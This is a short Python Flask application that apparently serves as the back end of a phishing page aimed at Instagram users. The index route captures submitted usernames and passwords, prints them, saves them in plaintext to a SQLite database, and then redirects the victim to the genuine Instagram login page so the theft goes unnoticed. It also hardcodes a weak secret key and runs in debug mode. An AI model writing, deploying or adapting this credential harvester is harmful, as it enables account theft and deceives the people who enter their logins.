from flask import Flask, render_template, request, redirect
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
db = SQLAlchemy(app)
app.secret_key = 'asdfghjkl'

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)  # Added nullable=False for better safety
    password = db.Column(db.String(100), nullable=False)  # Added nullable=False for better safety

    def __init__(self, username, password):
        self.username = username
        self.password = password


with app.app_context():
    db.create_all()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        # Use .get() to prevent KeyError
        username = request.form.get('username')  
        password = request.form.get('password')  

        # Debugging: Print the values received
        print("Received Username:", username)
        print("Received Password:", password)

        if username and password:  # Check if values are not None
            new_user = User(username=username, password=password)
            db.session.add(new_user)
            db.session.commit()
        #     print("User added to database")
        # else:
        #     print("Username or password is None")
        return redirect("https://www.instagram.com/login")

    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True) 
